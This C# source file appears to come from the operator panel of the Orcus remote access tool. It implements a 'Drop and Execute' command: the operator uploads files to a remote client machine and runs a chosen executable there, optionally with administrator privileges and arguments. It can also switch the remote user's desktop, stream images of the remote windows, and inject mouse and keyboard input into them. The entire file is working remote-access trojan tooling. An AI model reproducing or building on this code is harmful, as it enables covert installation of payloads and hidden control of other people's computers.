using System;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Data;
using System.Windows.Input;
using System.Windows.Media.Imaging;
using Microsoft.Win32;
using Orcus.Administration.Commands.DropAndExecute;
using Orcus.Administration.Core.CommandManagement.View;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Administration.ViewModels.CommandViewModels.DropAndExecute;
using Orcus.Shared.Commands.DropAndExecute;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    [MinimumClientVersion(18)]
    public class DropAndExecuteViewModel : CommandView
    {
        private readonly string[] _executableExtensions = {"exe", "msi", "bat", "cmd", "reg", "vbs", "com"};

        private WriteableBitmap _applicationBitmap;
        private string _arguments;
        private RelayCommand<UploadTask> _cancelUploadCommand;
        private DropAndExecuteState _currentState;
        private DropAndExecuteCommand _dropAndExecuteCommand;
        private RelayCommand _executeCommand;
        private bool _executeWithAdministratorPrivileges;
        private ExecutionMode _executionMode;
        private bool _isStreaming;
        private long _lastWindowHandle;
        private bool _readyToExecute;
        private RelayCommand _selectFilesCommand;
        private RelayCommand _stopExecutionCommand;
        private RelayCommand _stopStreamingCommand;
        private RelayCommand _switchUserToCurrentDesktopCommand;
        private RelayCommand _switchUserToDefaultDesktopCommand;
        private ICollectionView _uploadedTasksCollection;
        private ObservableCollection<UploadTask> _uploadTasks;

        public override string Name { get; } = (string) Application.Current.Resources["DropExecute"];
        public override Category Category { get; } = Category.Client;

        public ExecutionMode ExecutionMode
        {
            get { return _executionMode; }
            set { SetProperty(value, ref _executionMode); }
        }

        public string Arguments
        {
            get { return _arguments; }
            set { SetProperty(value, ref _arguments); }
        }

        public bool ExecuteWithAdministratorPrivileges
        {
            get { return _executeWithAdministratorPrivileges; }
            set { SetProperty(value, ref _executeWithAdministratorPrivileges); }
        }

        public ICollectionView UploadedTasksCollection
        {
            get { return _uploadedTasksCollection; }
            set { SetProperty(value, ref _uploadedTasksCollection); }
        }

        public DropAndExecuteState CurrentState
        {
            get { return _currentState; }
            set { SetProperty(value, ref _currentState); }
        }

        public bool ReadyToExecute
        {
            get { return _readyToExecute; }
            set { SetProperty(value, ref _readyToExecute); }
        }

        public bool IsStreaming
        {
            get { return _isStreaming; }
            set { SetProperty(value, ref _isStreaming); }
        }

        public WriteableBitmap ApplicationBitmap
        {
            get { return _applicationBitmap; }
            set { SetProperty(value, ref _applicationBitmap); }
        }

        public RelayCommand SelectFilesCommand
        {
            get
            {
                return _selectFilesCommand ?? (_selectFilesCommand = new RelayCommand(parameter =>
                {
                    var ofd = new OpenFileDialog
                    {
                        Filter = $"{Application.Current.Resources["AllFiles"]}|*.*",
                        //  Filter =
                        //     $"{Application.Current.Resources["ExecutableFiles"]}|*.exe;*.bin;*.cmd;*.bat;*.msi;*.vbs|{Application.Current.Resources["AllFiles"]}|*.*",
                        Title = (string) Application.Current.Resources["SelectTheFileYouWantToExecute"],
                        CheckFileExists = true,
                        CheckPathExists = true,
                        AddExtension = true,
                        Multiselect = true
                    };

                    if (WindowService.ShowDialog(x => ofd.ShowDialog(x)) == true)
                        UploadAndExecute(ofd.FileNames);
                }));
            }
        }

        public RelayCommand<UploadTask> CancelUploadCommand
        {
            get
            {
                return _cancelUploadCommand ?? (_cancelUploadCommand = new RelayCommand<UploadTask>(parameter =>
                {
                    parameter.IsCanceled = true;
                    _uploadTasks.Remove(parameter);

                    if (parameter.IsUploaded)
                        _dropAndExecuteCommand.RemoveRemoteFile(parameter);
                }));
            }
        }

        public RelayCommand ExecuteCommand
        {
            get
            {
                return _executeCommand ?? (_executeCommand = new RelayCommand(parameter =>
                {
                    var fileToExecute = _uploadTasks.SingleOrDefault(x => x.ExecuteFile);
                    if (fileToExecute == null)
                    {
                        //that should not happen
                        WindowService.ShowMessageBox("Please select one file to execute");
                        return;
                    }

                    _dropAndExecuteCommand.Execute(fileToExecute, ExecutionMode, ExecuteWithAdministratorPrivileges,
                        Arguments);
                }));
            }
        }

        public RelayCommand StopStreamingCommand
        {
            get
            {
                return _stopStreamingCommand ?? (_stopStreamingCommand = new RelayCommand(parameter =>
                {
                    IsStreaming = false;
                    _dropAndExecuteCommand.StopStreaming();
                }));
            }
        }

        public RelayCommand StopExecutionCommand
        {
            get
            {
                return _stopExecutionCommand ?? (_stopExecutionCommand = new RelayCommand(parameter =>
                {
                    IsStreaming = false;
                    _dropAndExecuteCommand.StopExecution();
                }));
            }
        }

        public RelayCommand SwitchUserToCurrentDesktopCommand
        {
            get
            {
                return _switchUserToCurrentDesktopCommand ??
                       (_switchUserToCurrentDesktopCommand =
                           new RelayCommand(parameter => { _dropAndExecuteCommand.SwitchUserToCurrentDesktop(); }));
            }
        }

        public RelayCommand SwitchUserToDefaultDesktopCommand
        {
            get
            {
                return _switchUserToDefaultDesktopCommand ??
                       (_switchUserToDefaultDesktopCommand =
                           new RelayCommand(parameter => { _dropAndExecuteCommand.SwitchUserToDefaultDesktop(); }));
            }
        }

        public void UploadAndExecute(string[] files)
        {
            ReadyToExecute = false;

            var electExecutingFile = false;

            if (_uploadTasks == null)
            {
                _uploadTasks = new ObservableCollection<UploadTask>();
                var collectionViewSource = new CollectionViewSource {Source = _uploadTasks};

                collectionViewSource.SortDescriptions.Add(new SortDescription(nameof(UploadTask.ExecuteFile),
                    ListSortDirection.Descending));

                collectionViewSource.LiveSortingProperties.Add(nameof(UploadTask.ExecuteFile));
                collectionViewSource.IsLiveSortingRequested = true;

                UploadedTasksCollection = collectionViewSource.View;
                electExecutingFile = true;
            }
            else
            {
                foreach (var file in files)
                {
                    if (_executableExtensions.Any(x => file.EndsWith(x, StringComparison.OrdinalIgnoreCase)))
                    {
                        electExecutingFile = true;
                        foreach (var uploadTask in _uploadTasks)
                            uploadTask.ExecuteFile = false;

                        break;
                    }
                }
            }

            foreach (var file in files)
            {
                //dont add duplicates
                if (_uploadTasks.Any(x => x.SourceFile == file))
                    continue;

                var fileInfo = new FileInfo(file);
                _uploadTasks.Add(new UploadTask
                {
                    FileLength = fileInfo.Length,
                    Name = fileInfo.Name,
                    SourceFile = file
                });
            }

            if (electExecutingFile)
            {
                //extensions are ordered by relevance
                foreach (var executableExtension in _executableExtensions)
                {
                    var executableFile =
                        _uploadTasks.FirstOrDefault(
                            x => x.Name.EndsWith(executableExtension, StringComparison.OrdinalIgnoreCase));
                    if (executableFile != null)
                    {
                        executableFile.ExecuteFile = true;
                        break;
                    }
                }
            }

            _dropAndExecuteCommand.UploadTasks(_uploadTasks.ToList());
        }

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            _dropAndExecuteCommand = clientController.Commander.GetCommand<DropAndExecuteCommand>();
            _dropAndExecuteCommand.UploadFinished += DropAndExecuteCommandOnUploadFinished;
            _dropAndExecuteCommand.StreamingStarted += DropAndExecuteCommandOnStreamingStarted;
            _dropAndExecuteCommand.StreamingStopped += DropAndExecuteCommandOnStreamingStopped;
        }

        private void DropAndExecuteCommandOnStreamingStopped(object sender, EventArgs eventArgs)
        {
            IsStreaming = false;
        }

        private void DropAndExecuteCommandOnStreamingStarted(object sender, EventArgs eventArgs)
        {
            _lastWindowHandle = 0;
            IsStreaming = true;
            _dropAndExecuteCommand.RenderEngine.WindowsUpdated += RenderEngineOnWindowsUpdated;
        }

        private void RenderEngineOnWindowsUpdated(object sender, EventArgs eventArgs)
        {
            ApplicationBitmap = _dropAndExecuteCommand.RenderEngine.ApplicationsBitmap;
        }

        private void CalculateCursorPosition(Point cursorPositionOnImage, Size imageSize, out int x, out int y)
        {
            var writeableBitmap = ApplicationBitmap;
            x = (int) (cursorPositionOnImage.X / imageSize.Width * writeableBitmap.Width);
            y = (int) (cursorPositionOnImage.Y / imageSize.Height * writeableBitmap.Height);
        }

        public async void ApplicationImageOnMouseDown(MouseButtonEventArgs e, Size imageSize, Point cursorPosition)
        {
            if (!IsStreaming)
                return;

            int x;
            int y;
            CalculateCursorPosition(cursorPosition, imageSize, out x, out y);
            var window = await _dropAndExecuteCommand.RenderEngine.GetWindow(x, y);
            if (window == null)
                return;

            _dropAndExecuteCommand.RenderEngine.TranslatePoint(window, ref x, ref y);
            _dropAndExecuteCommand.MouseDown(x, y, e.ChangedButton, window.Handle);

            _lastWindowHandle = window.Handle;
        }

        public async void ApplicationImageOnMouseUp(MouseButtonEventArgs e, Size imageSize, Point cursorPosition)
        {
            if (!IsStreaming)
                return;

            int x;
            int y;
            CalculateCursorPosition(cursorPosition, imageSize, out x, out y);
            var window = await _dropAndExecuteCommand.RenderEngine.GetWindow(x, y);
            if (window == null)
                return;

            _dropAndExecuteCommand.RenderEngine.TranslatePoint(window, ref x, ref y);
            _dropAndExecuteCommand.MouseUp(x, y, e.ChangedButton, window.Handle);

            _lastWindowHandle = window.Handle;
        }

        public async void ApplicationImageOnMouseWheel(MouseWheelEventArgs e, Size imageSize, Point cursorPosition)
        {
            if (!IsStreaming)
                return;

            int x;
            int y;
            CalculateCursorPosition(cursorPosition, imageSize, out x, out y);
            var window = await _dropAndExecuteCommand.RenderEngine.GetWindow(x, y);
            if (window == null)
                return;

            _dropAndExecuteCommand.RenderEngine.TranslatePoint(window, ref x, ref y);
            _dropAndExecuteCommand.MouseWheel(x, y, e.Delta, window.Handle);

            _lastWindowHandle = window.Handle;
        }

        public async void ApplicationImageOnKeyDown(KeyEventArgs e)
        {
            if (!IsStreaming)
                return;

            _dropAndExecuteCommand.KeyDown(KeyInterop.VirtualKeyFromKey(e.Key), await GetLastWindowHandle());
        }

        public async void ApplicationImageOnKeyUp(KeyEventArgs e)
        {
            if (!IsStreaming)
                return;

            _dropAndExecuteCommand.KeyUp(KeyInterop.VirtualKeyFromKey(e.Key), await GetLastWindowHandle());
        }

        private async Task<long> GetLastWindowHandle()
        {
            var allWindowHandles = await _dropAndExecuteCommand.RenderEngine.GetAllWindowHandles();

            if (_lastWindowHandle != 0 && allWindowHandles.Contains(_lastWindowHandle))
                return _lastWindowHandle;

            return allWindowHandles.FirstOrDefault();
        }

        private void DropAndExecuteCommandOnUploadFinished(object sender, EventArgs eventArgs)
        {
            ReadyToExecute = true;
        }
    }
}